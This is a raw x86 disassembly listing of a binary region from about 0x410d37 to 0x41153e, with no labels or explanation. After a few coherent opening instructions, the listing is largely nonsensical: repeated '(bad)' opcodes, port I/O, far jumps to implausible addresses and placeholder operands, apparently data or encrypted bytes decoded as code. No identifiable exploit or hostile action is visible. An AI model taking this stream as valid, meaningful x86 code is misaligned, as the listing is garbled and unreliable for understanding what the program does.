  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	(bad)  
  410d61:	clc    
  410d62:	in     al,dx
  410d63:	(bad)  
  410d64:	clc    
  410d65:	push   esp
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	out    0x37,eax
  410d6e:	and    ecx,ecx
  410d70:	inc    edx
  410d71:	and    al,bh
  410d73:	addr16 out dx,al
  410d75:	mov    eax,0xaa5e788c
  410d7a:	sub    ah,al
  410d7c:	push   edx
  410d7d:	(bad)  
  410d7e:	loope  0x410d58
  410d80:	loope  0x410db9
  410d82:	scas   eax,DWORD PTR es:[edi]
  410d83:	pop    esi
  410d84:	je     0x410dec
  410d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d87:	addr16 aad 0x7c
  410d8a:	push   0xffffffe3
  410d8c:	test   dh,dl
  410d8e:	jp     0x410d95
  410d90:	clc    
  410d91:	cmp    bh,0x32
  410d94:	jo     0x410d1c
  410d96:	aaa    
  410d97:	sub    esp,DWORD PTR [eax]
  410d99:	adc    eax,0x42e71f86
  410d9e:	clc    
  410d9f:	test   al,0xed
  410da1:	addr16 sbb eax,0xde8cc926
  410da7:	jnp    0x410d91
  410da9:	in     al,dx
  410daa:	es pop eax
  410dac:	mov    ch,0x7b
  410dae:	sub    esi,ecx
  410db0:	jp     0x410d5f
  410db2:	and    eax,edx
  410db4:	ret    0xb1dc
  410db7:	mov    WORD PTR [ecx],?
  410db9:	jg     0x410dc7
  410dbb:	mov    BYTE PTR [edx+0x77650463],ah
  410dc1:	mov    ch,BYTE PTR [ecx]
  410dc3:	inc    ecx
  410dc4:	stos   BYTE PTR es:[edi],al
  410dc5:	jnp    0x410db7
  410dc7:	call   0xb6b536d7
  410dcc:	jmp    0xdaf26335
  410dd1:	in     al,0xb2
  410dd3:	fsubr  QWORD PTR [ecx-0x3fe53eed]
  410dd9:	cld    
  410dda:	ja     0x410e29
  410ddc:	cwde   
  410ddd:	sbb    al,BYTE PTR [edx+0x623fde2]
  410de3:	and    ebx,ecx
  410de5:	jecxz  0x410d85
  410de7:	xchg   edx,eax
  410de8:	xor    edx,ecx
  410dea:	xor    ch,BYTE PTR [ecx+0x63]
  410ded:	(bad)  
  410dee:	push   ebp
  410def:	add    edx,DWORD PTR [edx-0x61]
  410df2:	popf   
  410df3:	rcr    edx,cl
  410df5:	neg    ecx
  410df7:	add    dh,dh
  410df9:	push   esp
  410dfa:	loopne 0x410dd0
  410dfc:	lods   al,BYTE PTR ds:[esi]
  410dfd:	adc    ch,ch
  410dff:	mov    DWORD PTR [eax-0x79076ad2],edi
  410e05:	sbb    BYTE PTR [edi+ebp*1-0x67266e2e],ch
  410e0c:	pop    ss
  410e0d:	gs push ss
  410e0f:	or     edi,esp
  410e11:	aas    
  410e12:	fyl2x  
  410e14:	outs   dx,BYTE PTR ds:[esi]
  410e15:	imul   esp,DWORD PTR ds:0xda921b7f,0xaecd12a4
  410e1f:	cmp    BYTE PTR [ebx],cl
  410e21:	js     0x410e5f
  410e23:	enter  0xa19c,0xcb
  410e27:	lods   al,BYTE PTR ds:[esi]
  410e28:	jg     0x410e3f
  410e2a:	(bad)  
  410e2b:	cmp    esi,DWORD PTR [edx]
  410e2d:	jo     0x410e52
  410e2f:	in     al,0x4a
  410e31:	cmp    DWORD PTR ds:[ebx+esi*8+0x31f88f31],0xfdd95888
  410e3d:	je     0x410e86
  410e3f:	pop    edx
  410e40:	arpl   WORD PTR [ecx+0x53aedbf1],di
  410e46:	sub    BYTE PTR [ebx],cl
  410e48:	shl    DWORD PTR [edi-0x23],cl
  410e4b:	(bad)  
  410e4c:	loope  0x410e49
  410e4e:	or     al,BYTE PTR [ecx]
  410e50:	pop    ss
  410e51:	mov    dl,0x52
  410e53:	lea    eax,[esi+0xf]
  410e56:	xor    DWORD PTR [ebx-0x73],ebp
  410e59:	outs   dx,BYTE PTR ds:[esi]
  410e5a:	stos   DWORD PTR es:[edi],eax
  410e5b:	dec    edi
  410e5c:	jp     0x410e6b
  410e5e:	cld    
  410e5f:	jbe    0x410e6f
  410e61:	jle    0x410ec2
  410e63:	inc    eax
  410e64:	jecxz  0x410e97
  410e66:	das    
  410e67:	ja     0x410df1
  410e69:	ficomp WORD PTR [edi+0x5e887d21]
  410e6f:	bound  ecx,QWORD PTR [edx]
  410e71:	mov    ebp,0xc0394d43
  410e76:	iret   
  410e77:	jl     0x410e30
  410e79:	jae    0x410ed9
  410e7b:	add    ebx,DWORD PTR [eax-0x79]
  410e7e:	int3   
  410e7f:	xor    al,0x31
  410e81:	inc    edx
  410e82:	mov    ds:0xc7da5901,eax
  410e87:	push   cs
  410e88:	out    0xd6,eax
  410e8a:	stos   WORD PTR es:[edi],ax
  410e8c:	xlat   BYTE PTR ds:[ebx]
  410e8d:	jbe    0x410f05
  410e8f:	fdivr  QWORD PTR [edi+0x13]
  410e92:	in     al,0xc8
  410e94:	xchg   BYTE PTR [eax],al
  410e96:	pusha  
  410e97:	xor    ebx,DWORD PTR [edx+0x1b]
  410e9a:	jae    0x410e82
  410e9c:	call   0xb163:0x6268adad
  410ea3:	test   ax,0x43d9
  410ea7:	fcomip st,st(5)
  410ea9:	add    bl,BYTE PTR [edx+0x195145e5]
  410eaf:	(bad)  
  410eb0:	mov    ecx,0x7d8e6b1b
  410eb5:	daa    
  410eb6:	loop   0x410eef
  410eb8:	push   es
  410eb9:	enter  0xf032,0xe6
  410ebd:	push   0x2138532d
  410ec2:	or     eax,ecx
  410ec4:	add    BYTE PTR [ebx-0x13],0xaf
  410ec8:	sub    BYTE PTR [edi-0x13bdc6b7],bh
  410ece:	out    0x4b,al
  410ed0:	mov    bh,0xac
  410ed2:	push   edx
  410ed3:	xchg   ebx,eax
  410ed4:	mov    eax,ds:0xfd813954
  410ed9:	in     eax,dx
  410eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410edb:	hlt    
  410edc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410edd:	ret    
  410ede:	sbb    ebp,esp
  410ee0:	mov    DWORD PTR [ebp-0x3488830],0x1b52e9d4
  410eea:	or     DWORD PTR [ecx+0x7b88347a],ecx
  410ef0:	cmc    
  410ef1:	out    0xf6,al
  410ef3:	outs   dx,DWORD PTR ds:[esi]
  410ef4:	sahf   
  410ef5:	xor    DWORD PTR [ebp-0x5],0xffffffca
  410ef9:	fcom   DWORD PTR [eax]
  410efb:	gs jp  0x410f4a
  410efe:	std    
  410eff:	adc    edx,DWORD PTR ds:0x43e85261
  410f05:	retf   0x668c
  410f08:	dec    ebx
  410f09:	pop    ss
  410f0a:	sbb    eax,0x757e8d6b
  410f0f:	mov    ch,0x65
  410f11:	call   0xf9ef:0x71ec9ae
  410f18:	leave  
  410f19:	xchg   BYTE PTR ds:0x9543870,bl
  410f1f:	cdq    
  410f20:	outs   dx,BYTE PTR ds:[esi]
  410f21:	xor    al,0xd1
  410f23:	dec    ebx
  410f24:	sub    BYTE PTR [ebx],ah
  410f26:	enter  0x8599,0x4
  410f2a:	sub    bl,BYTE PTR [esp+ecx*4-0x40]
  410f2e:	and    cl,cl
  410f30:	fs es sub bl,al
  410f34:	add    al,0x26
  410f36:	jmp    0x56238775
  410f3b:	bound  eax,QWORD PTR [ecx+0x6acaa2a3]
  410f41:	push   0x24
  410f43:	sbb    esp,DWORD PTR [ecx-0x74cb55a7]
  410f49:	inc    edi
  410f4a:	jl     0x410f12
  410f4c:	(bad)
  410f50:	push   0x4e
  410f52:	dec    ecx
  410f53:	dec    ebx
  410f54:	cmp    BYTE PTR [esi+ebp*1-0x14],bh
  410f58:	nop
  410f59:	mov    bl,0x4b
  410f5b:	add    DWORD PTR [eax],ebx
  410f5d:	out    dx,al
  410f5e:	inc    ecx
  410f5f:	adc    ch,BYTE PTR [edx-0x56]
  410f62:	sbb    DWORD PTR [esi-0x53],ebp
  410f65:	ret    0x92a7
  410f68:	jmp    0x8ce5affc
  410f6d:	loopne 0x410f86
  410f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f70:	push   0x37
  410f72:	mov    ecx,0x2cfa2a20
  410f77:	sar    DWORD PTR [ebp+0x7b340031],1
  410f7d:	cmp    eax,DWORD PTR [ebp-0x16]
  410f80:	mov    ecx,0xea99bbe4
  410f85:	stos   DWORD PTR es:[edi],eax
  410f86:	arpl   WORD PTR [eax],cx
  410f88:	(bad)  
  410f89:	retf   
  410f8a:	mov    cl,BYTE PTR [edi-0x1e571b53]
  410f90:	clc    
  410f91:	stc    
  410f92:	(bad)  
  410f94:	stc    
  410f95:	inc    esi
  410f96:	or     BYTE PTR [eax],bl
  410f98:	push   cs
  410f99:	rol    BYTE PTR [ebx-0xe52df9c],1
  410f9f:	mov    ebp,0xabf9579b
  410fa4:	xor    DWORD PTR [edx],esp
  410fa6:	or     DWORD PTR [edx+0x29],edx
  410fa9:	adc    DWORD PTR ds:0x1e0da7e9,edi
  410faf:	cmp    bh,al
  410fb1:	aam    0xb
  410fb3:	test   al,0xc0
  410fb5:	xchg   esp,eax
  410fb6:	adc    bh,BYTE PTR [ebp-0x121f7c6]
  410fbc:	jmp    0x29a3:0x7b7aaa50
  410fc3:	rol    BYTE PTR [edx+0x33],cl
  410fc6:	xchg   esi,eax
  410fc7:	or     al,BYTE PTR [edx+0x2c]
  410fca:	xchg   edx,eax
  410fcb:	and    al,0xeb
  410fcd:	in     eax,dx
  410fce:	inc    eax
  410fcf:	fst    DWORD PTR [ebx+esi*1-0x39]
  410fd3:	cmc    
  410fd4:	dec    edi
  410fd5:	mov    bh,0xc3
  410fd7:	add    edi,ecx
  410fd9:	jmp    0x411261
  410fde:	int3   
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	data16 sub ax,0xa86f
  410fee:	gs pop edx
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	stos   DWORD PTR es:[edi],eax
  410ff7:	mov    eax,0x6c116cef
  410ffc:	cli    
  410ffd:	mov    eax,ds:0x4f2f8620
  411002:	xchg   edi,eax
  411003:	sbb    eax,0xe912fbb3
  411008:	mov    al,0x3a
  41100a:	ret    
  41100b:	mov    esp,0x5aabf46e
  411010:	repnz fwait
  411012:	lock addr16 sahf 
  411015:	inc    eax
  411016:	push   ebx
  411017:	sahf   
  411018:	or     al,0x1e
  41101a:	xor    al,BYTE PTR [ecx-0x8]
  41101d:	cwde   
  41101e:	(bad)  
  41101f:	les    ebp,FWORD PTR [esi-0x3b]
  411022:	mov    cl,0x80
  411024:	and    al,0x0
  411026:	retf   
  411027:	mov    ds:0x85ce0d6,eax
  41102c:	jo     0x411061
  41102e:	arpl   bp,di
  411030:	mov    ds:0xaab22c7f,al
  411035:	fs mov edx,0x57c44e71
  41103b:	mov    ecx,0x3d586ea1
  411040:	jle    0x41105c
  411042:	in     eax,dx
  411043:	jmp    0xb03e:0xa07234c0
  41104a:	mov    esp,0xe8673bc6
  41104f:	cmp    al,0x16
  411051:	fsubr  st,st(6)
  411053:	inc    ebx
  411054:	dec    ebp
  411055:	adc    DWORD PTR [ebp-0x3ddd3abe],esp
  41105b:	adc    al,0x14
  41105d:	test   BYTE PTR [edx-0x496778a4],al
  411063:	lahf   
  411064:	bound  edx,QWORD PTR [edx]
  411066:	cmp    ecx,DWORD PTR [ecx]
  411068:	dec    ebp
  411069:	std    
  41106a:	popa   
  41106b:	leave  
  41106c:	push   es
  41106d:	test   eax,0x2768febc
  411072:	clc    
  411073:	sub    bl,ch
  411075:	push   cs
  411076:	test   DWORD PTR [edi+0x25339ef1],ebp
  41107c:	inc    edx
  41107d:	inc    ebx
  41107e:	cmp    bh,BYTE PTR [ecx+0x448bd6cb]
  411084:	sbb    ch,ah
  411086:	(bad)  
  411087:	adc    BYTE PTR [ebx-0x7a386dba],dh
  41108d:	and    al,0x89
  41108f:	repz pop esp
  411091:	xchg   ecx,eax
  411092:	or     al,0xf0
  411094:	les    esi,FWORD PTR [ebp-0x5e7f12fe]
  41109a:	xor    eax,DWORD PTR [ecx]
  41109c:	push   edi
  41109d:	(bad)  
  41109e:	(bad)  
  41109f:	jmp    0xcd47d088
  4110a4:	enter  0x4bc5,0x4c
  4110a8:	sbb    esi,esi
  4110aa:	aad    0x46
  4110ac:	cdq    
  4110ad:	cli    
  4110ae:	xchg   edi,eax
  4110af:	mov    esi,0x26d5b3f2
  4110b4:	or     eax,0x4829d41c
  4110b9:	mov    dl,0x73
  4110bb:	pushf  
  4110bc:	adc    BYTE PTR ds:0x759d7679,dh
  4110c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110c3:	push   esp
  4110c4:	test   eax,0xae66c26b
  4110c9:	pop    edi
  4110ca:	outs   dx,DWORD PTR ds:[esi]
  4110cb:	adc    eax,0x3de9c788
  4110d0:	enter  0xf663,0x8e
  4110d4:	test   eax,0x24cfb66b
  4110d9:	cmp    DWORD PTR [ecx-0x3a23e0e],ebx
  4110df:	xchg   esi,eax
  4110e0:	scas   eax,DWORD PTR es:[edi]
  4110e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110e2:	js     0x411077
  4110e4:	jns    0x4110c5
  4110e6:	mov    ebx,0x1161b67e
  4110eb:	psraw  mm3,QWORD PTR [ecx]
  4110ee:	pop    ebx
  4110ef:	popa   
  4110f0:	mov    BYTE PTR [ecx+0xb],dl
  4110f3:	xchg   ebp,eax
  4110f4:	imul   ah
  4110f6:	call   0x5e2d666d
  4110fb:	inc    ebp
  4110fc:	aas    
  4110fd:	in     eax,dx
  4110fe:	push   ecx
  4110ff:	dec    esp
  411100:	jnp    0x41117a
  411102:	fldcw  WORD PTR [eax-0x19]
  411105:	jb     0x41112b
  411107:	jo     0x411172
  411109:	shl    esi,cl
  41110b:	mov    eax,0x434f47ba
  411110:	aad    0x76
  411112:	leave  
  411113:	cmp    dh,ah
  411115:	in     al,0xa1
  411117:	ins    DWORD PTR es:[edi],dx
  411118:	inc    eax
  411119:	int3   
  41111a:	cli    
  41111b:	mov    eax,0xdde58f71
  411120:	adc    eax,0xb58e6ab6
  411125:	out    0x11,eax
  411127:	or     eax,0x3fad6646
  41112c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41112d:	push   esp
  41112e:	and    al,0xff
  411130:	or     BYTE PTR [esi+0x56],cl
  411133:	popf   
  411134:	stos   BYTE PTR es:[edi],al
  411135:	xor    eax,0x9d66d05e
  41113a:	outs   dx,DWORD PTR ds:[esi]
  41113b:	nop
  41113c:	or     al,0x99
  41113e:	dec    esp
  41113f:	jmp    0xc495:0x786ee6dd
  411146:	mov    al,dl
  411148:	nop
  411149:	fld    DWORD PTR [esi+0x237b6225]
  41114f:	shl    DWORD PTR [eax],1
  411151:	adc    al,0x99
  411153:	sub    cl,BYTE PTR [ecx-0x8649729]
  411159:	mov    al,0xca
  41115b:	imul   eax,DWORD PTR [ebx],0xc2928933
  411161:	jbe    0x4111ca
  411163:	sub    BYTE PTR [edx],dl
  411165:	mov    eax,cs
  411167:	jns    0x4111e0
  411169:	popa   
  41116a:	enter  0xfd15,0x83
  41116e:	mov    esp,0xde372b64
  411173:	sub    DWORD PTR [ebp+0x41c81ae9],ecx
  411179:	(bad)  
  41117b:	adc    bl,ah
  41117d:	test   BYTE PTR [edx+ebp*2],0x91
  411181:	inc    edi
  411182:	stos   DWORD PTR es:[edi],eax
  411183:	fs push 0x3f
  411186:	push   ebp
  411187:	add    ecx,edi
  411189:	dec    ebp
  41118a:	add    DWORD PTR [eax+0x49647f33],eax
  411190:	xchg   ebp,eax
  411191:	or     eax,0x8ecb3458
  411196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411197:	mov    ch,0xa
  411199:	ja     0x4111f7
  41119b:	xor    ah,BYTE PTR [edi+0x5ddae12b]
  4111a1:	dec    dh
  4111a3:	mov    al,0xd3
  4111a5:	les    ecx,FWORD PTR [ebp+0x3f]
  4111a8:	aaa    
  4111a9:	mov    edx,0xf974db8d
  4111ae:	pop    edx
  4111af:	push   cs
  4111b0:	mov    eax,0x7fb3ee49
  4111b5:	mov    ds:0xbd2a88b6,al
  4111ba:	sub    DWORD PTR [edx-0x52],edx
  4111bd:	and    DWORD PTR [ebp+0x49fa0065],edx
  4111c3:	mov    edi,DWORD PTR [esi+0x38]
  4111c6:	call   0xa740e9cb
  4111cb:	mov    ebx,0xea662b39
  4111d0:	pop    ss
  4111d1:	repz int 0x2c
  4111d4:	jb     0x41122b
  4111d6:	and    ah,bh
  4111d8:	or     eax,0x8509a4d7
  4111dd:	push   eax
  4111de:	or     al,0x54
  4111e0:	xchg   esp,eax
  4111e1:	out    0x8c,al
  4111e3:	add    DWORD PTR [edx+0x2ec11f90],ecx
  4111e9:	outs   dx,DWORD PTR ds:[esi]
  4111ea:	add    bh,BYTE PTR [edi-0x19]
  4111ed:	cdq    
  4111ee:	pushf  
  4111ef:	adc    dl,BYTE PTR [bx+di]
  4111f2:	mov    cl,0xb1
  4111f4:	push   esp
  4111f5:	(bad)  
  4111f6:	jb     0x411254
  4111f8:	pop    ss
  4111f9:	push   es
  4111fa:	stos   BYTE PTR es:[edi],al
  4111fb:	dec    ebx
  4111fc:	test   al,0x89
  4111fe:	and    DWORD PTR [eax],edi
  411200:	add    dh,ch
  411202:	xchg   BYTE PTR [ebx-0x4e2d0409],cl
  411208:	push   eax
  411209:	test   BYTE PTR [ebp+ebx*1-0x9],bl
  41120d:	jmp    0x411193
  41120f:	sti    
  411210:	xor    BYTE PTR [esi-0x39],cl
  411213:	cmp    DWORD PTR [ebx],0x99bfa637
  411219:	sahf   
  41121a:	adc    eax,0xe19b92fe
  41121f:	adc    DWORD PTR [ebp-0x34],edi
  411222:	or     ch,bl
  411224:	adc    ebx,DWORD PTR [edi+eiz*8-0x67776cb7]
  41122b:	ss cld 
  41122d:	push   eax
  41122e:	mov    esi,0x4e5b0f97
  411233:	out    0xa9,eax
  411235:	sahf   
  411236:	xor    eax,0x370df9a7
  41123b:	xor    eax,edi
  41123d:	jg     0x4111fa
  41123f:	inc    edx
  411240:	jl     0x4111e5
  411242:	sbb    dh,BYTE PTR [edi+ecx*2]
  411245:	shl    cl,1
  411247:	sbb    eax,0x832ab97b
  41124c:	xor    al,0x3f
  41124e:	mov    ?,WORD PTR ds:0x87d43840
  411254:	fild   DWORD PTR [ebx+0x4d72c43]
  41125a:	popa   
  41125b:	pop    esp
  41125c:	inc    ebx
  41125d:	test   BYTE PTR [esp+edi*2],ah
  411260:	jnp    0x411265
  411262:	ror    DWORD PTR [edi],1
  411264:	scas   eax,DWORD PTR es:[edi]
  411265:	xlat   BYTE PTR ds:[ebx]
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax+0x4b],al
  411278:	mov    eax,0x5fd21d98
  41127d:	js     0x4112f7
  41127f:	in     eax,0x7e
  411281:	js     0x4112fb
  411283:	in     al,dx
  411284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411285:	retf   
  411286:	fwait
  411287:	ret    0xf5f0
  41128a:	into   
  41128b:	push   ebx
  41128c:	out    dx,al
  41128d:	dec    esi
  41128e:	lods   al,BYTE PTR ds:[esi]
  41128f:	or     ch,bl
  411291:	loope  0x411266
  411293:	dec    ebp
  411294:	xor    esi,DWORD PTR [edi-0x74]
  411297:	mov    esp,0x79ceb41f
  41129c:	frstor [edi+eiz*4-0x7c]
  4112a0:	test   DWORD PTR [eax-0x324036ce],esi
  4112a6:	call   0x238c:0xaf262446
  4112ad:	sbb    ch,dh
  4112af:	jmp    0xb1578738
  4112b4:	sub    eax,0x82fbf20b
  4112b9:	mov    ch,0x4d
  4112bb:	int3   
  4112bc:	imul   esp,DWORD PTR [esi],0xffffffa0
  4112bf:	adc    ebp,edx
  4112c1:	rcl    DWORD PTR ss:[edi+edi*1+0xa1bd47e],1
  4112c9:	test   al,0x5c
  4112cb:	push   ds
  4112cc:	jp     0x411334
  4112ce:	xor    eax,DWORD PTR [ecx+ebx*4+0xb785f0]
  4112d5:	out    0x2f,eax
  4112d7:	in     al,0x3c
  4112d9:	push   esi
  4112da:	jmp    0x4d9:0x255f2855
  4112e1:	cmp    DWORD PTR [esi+0x77],eax
  4112e4:	xchg   edx,eax
  4112e5:	cmc    
  4112e6:	xchg   ebp,ebp
  4112e8:	sub    ebx,ebx
  4112ea:	adc    bh,BYTE PTR [bp+0x2b80]
  4112ef:	xor    al,0x1e
  4112f1:	fisubr DWORD PTR [esi-0x425be918]
  4112f7:	lea    eax,[eax-0xd4171f8]
  4112fd:	scas   eax,DWORD PTR es:[edi]
  4112fe:	repz imul esp,DWORD PTR [esi-0x4501afc8],0x54d0f635
  411309:	lea    ebx,[edx+0x70]
  41130c:	pop    ds
  41130d:	into   
  41130e:	pop    esp
  41130f:	push   esi
  411310:	pushf  
  411311:	pop    es
  411312:	push   ds
  411313:	fwait
  411314:	jle    0x4112c5
  411316:	imul   DWORD PTR [edi-0x7a6ac84e]
  41131c:	fsubr  QWORD PTR [edx]
  41131e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41131f:	call   0x14125e2d
  411324:	jb     0x411315
  411326:	and    esi,DWORD PTR [ebx*4+0x2c22661a]
  41132d:	or     bh,BYTE PTR [eax-0x68272182]
  411333:	scas   eax,DWORD PTR es:[edi]
  411334:	jnp    0x4113b3
  411336:	xor    ecx,ebp
  411338:	or     al,0x67
  41133a:	or     al,0xb
  41133c:	mov    ch,0x26
  41133e:	mul    BYTE PTR [ecx-0x7a]
  411341:	xchg   esp,eax
  411342:	aaa    
  411343:	add    bl,BYTE PTR [ebp+eiz*4+0x4]
  411347:	test   DWORD PTR ds:0x5bd6e380,edx
  41134d:	mov    WORD PTR [edx+0x20cfb302],?
  411353:	and    eax,0x564c7b0f
  411358:	push   0x564f2661
  41135d:	push   esp
  41135e:	(bad)  
  41135f:	enter  0x661a,0xaa
  411363:	jmp    FWORD PTR [eax-0x52]
  411366:	dec    esi
  411367:	addr16 loop 0x41131d
  41136a:	push   0xffffffa8
  41136c:	ins    BYTE PTR es:[edi],dx
  41136d:	fs setns al
  411371:	dec    eax
  411372:	pop    ds
  411373:	test   DWORD PTR [ecx-0x5e],ebp
  411376:	scas   al,BYTE PTR es:[edi]
  411377:	bound  ebp,QWORD PTR [esi]
  411379:	pop    ds
  41137a:	cmp    BYTE PTR cs:[ebx+0x51],dl
  41137e:	mov    edi,0x28ab26bd
  411383:	je     0x4113a8
  411385:	xchg   esp,eax
  411386:	inc    ebp
  411387:	test   BYTE PTR [esi-0x44cca761],bl
  41138d:	mov    esp,0x30a5be00
  411392:	fdivr  st,st(7)
  411394:	add    eax,0x5b88886
  411399:	loope  0x411380
  41139b:	in     eax,0x3e
  41139d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41139e:	dec    edi
  41139f:	rcr    DWORD PTR ds:0xfe8d8ca1,1
  4113a5:	aam    0x6c
  4113a7:	push   ds
  4113a8:	js     0x411382
  4113aa:	test   eax,0x2d14875
  4113af:	xchg   esp,eax
  4113b0:	out    dx,al
  4113b1:	aas    
  4113b2:	xchg   edi,eax
  4113b3:	in     eax,0x2d
  4113b5:	xor    eax,0x32bdbb16
  4113ba:	inc    ebp
  4113bb:	cmc    
  4113bc:	ja     0x411437
  4113be:	cmc    
  4113bf:	xchg   ebx,eax
  4113c0:	mov    cs,WORD PTR [eax-0x4e]
  4113c3:	call   0x2f1d:0x997fd52f
  4113ca:	add    al,0x85
  4113cc:	push   cs
  4113cd:	push   0x7f5c293e
  4113d2:	xchg   DWORD PTR [esi],esp
  4113d4:	pop    edi
  4113d5:	xlat   BYTE PTR ds:[ebx]
  4113d6:	daa    
  4113d7:	bound  ebp,QWORD PTR [eax]
  4113d9:	sbb    edx,ebx
  4113db:	mov    eax,edi
  4113dd:	jbe    0x4113f6
  4113df:	enter  0xe963,0x37
  4113e3:	sbb    ch,BYTE PTR ds:0x17e9c01
  4113e9:	(bad)  
  4113ea:	hlt    
  4113eb:	mov    bl,0x53
  4113ed:	shr    esi,1
  4113ef:	mov    bl,BYTE PTR [ecx+0x5d]
  4113f2:	fsub   QWORD PTR [ecx]
  4113f4:	outs   dx,DWORD PTR fs:[esi]
  4113f6:	adc    BYTE PTR [esi-0x68d6a07b],al
  4113fc:	outs   dx,DWORD PTR ds:[esi]
  4113fd:	call   0x1ce6:0x8e1c4de8
  411404:	push   ebx
  411405:	adc    BYTE PTR [ebx-0x4a9da5bd],cl
  41140b:	scas   eax,DWORD PTR es:[edi]
  41140c:	and    ebx,DWORD PTR [eax-0x72704879]
  411412:	sti    
  411413:	lods   al,BYTE PTR ds:[esi]
  411414:	mov    esi,0x52f9ad39
  411419:	jbe    0x411402
  41141b:	cmp    eax,0xbe9ed4d4
  411420:	jle    0x4113d2
  411422:	loope  0x411447
  411424:	cld    
  411425:	jns    0x411492
  411427:	stos   DWORD PTR es:[edi],eax
  411428:	xchg   esp,eax
  411429:	and    eax,DWORD PTR [ebp+0x4149fc3b]
  41142f:	std    
  411430:	pop    ecx
  411431:	mov    DWORD PTR [edi],0xdacc429c
  411437:	call   0x1878:0x340cda7a
  41143e:	loopne 0x4113f7
  411440:	sub    BYTE PTR [esi],cl
  411442:	jbe    0x4113ca
  411444:	std    
  411445:	addr16 dec edi
  411447:	sub    ah,dl
  411449:	(bad)  
  41144a:	fadd   QWORD PTR [edi+0x38052c34]
  411450:	jmp    0xa4e7e86f
  411455:	dec    ecx
  411456:	sbb    bl,ah
  411458:	push   cs
  411459:	xchg   ebx,eax
  41145a:	xchg   esp,eax
  41145b:	sbb    dl,ah
  41145d:	iret   
  41145e:	ss pop edx
  411460:	xchg   ebx,eax
  411461:	xor    BYTE PTR [ecx-0x3ae370e7],dh
  411467:	mov    ebx,0xf63792c1
  41146c:	mov    edx,0x9afac614
  411471:	ds stos DWORD PTR es:[edi],eax
  411473:	mov    BYTE PTR [ebp-0x51],ch
  411476:	xor    esp,esp
  411478:	cld    
  411479:	out    0xb3,al
  41147b:	xchg   edi,eax
  41147c:	xor    DWORD PTR [ebx-0x5b],edx
  41147f:	add    al,0xe6
  411481:	mov    bl,0xa8
  411483:	cmp    DWORD PTR [edx-0x9],edi
  411486:	pop    es
  411487:	and    al,0xe4
  411489:	loope  0x41144b
  41148b:	popf   
  41148c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41148d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41148e:	cli    
  41148f:	or     al,0xfd
  411491:	mov    eax,0x20bdb7b9
  411496:	clc    
  411497:	aas    
  411498:	int3   
  411499:	enter  0xb8fa,0x0
  41149d:	inc    edx
  41149e:	and    eax,0x7e9b0553
  4114a3:	push   es
  4114a4:	jmp    0x3526:0x50d29de
  4114ab:	lods   al,BYTE PTR ds:[esi]
  4114ac:	fs mov ch,0x84
  4114af:	enter  0x1567,0x59
  4114b3:	sti    
  4114b4:	adc    eax,0xe5913b04
  4114b9:	mov    WORD PTR [eax-0x3d],fs
  4114bc:	clc    
  4114bd:	aas    
  4114be:	or     dh,ch
  4114c0:	adc    al,0x46
  4114c2:	mov    esi,0x6e874cc1
  4114c7:	ds mov ecx,0x4b2f015d
  4114cd:	enter  0xdbfc,0x8c
  4114d1:	sub    eax,0x76171e18
  4114d6:	mov    ecx,0x5459bbed
  4114db:	dec    edi
  4114dc:	xchg   edx,eax
  4114dd:	fiadd  DWORD PTR [edx-0x10]
  4114e0:	fsubr  QWORD PTR [eax+0x74]
  4114e3:	lahf   
  4114e4:	fdivr  st(1),st
  4114e6:	adc    ebp,DWORD PTR [ebx-0x284a62e6]
  4114ec:	(bad)  
  4114ed:	fmul   QWORD PTR [ebx+0x5d8bf87d]
  4114f3:	lock sub ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	pop    esp
  411510:	scas   al,BYTE PTR es:[edi]
  411511:	je     0x411494
  411513:	mov    edi,0xe578785d
  411518:	jle    0x411592
  41151a:	js     0x411574
  41151c:	jge    0x411544
  41151e:	jno    0x4114c5
  411520:	xor    BYTE PTR [esi],ch
  411522:	inc    edi
  411523:	cmc    
  411524:	loopne 0x41156b
  411526:	inc    ebp
  411527:	jecxz  0x4114be
  411529:	inc    ebx
  41152a:	int3   
  41152b:	dec    edx
  41152c:	int3   
  41152d:	pop    eax
  41152e:	mov    ecx,0x625eb042
  411533:	mov    al,ds:0xb6ef30a8
  411538:	rcr    BYTE PTR ds:[ecx-0x5d],1
  41153c:	sahf   
  41153d:	pop    ss
  41153e:	sbb    BYTE PTR [ebx],al
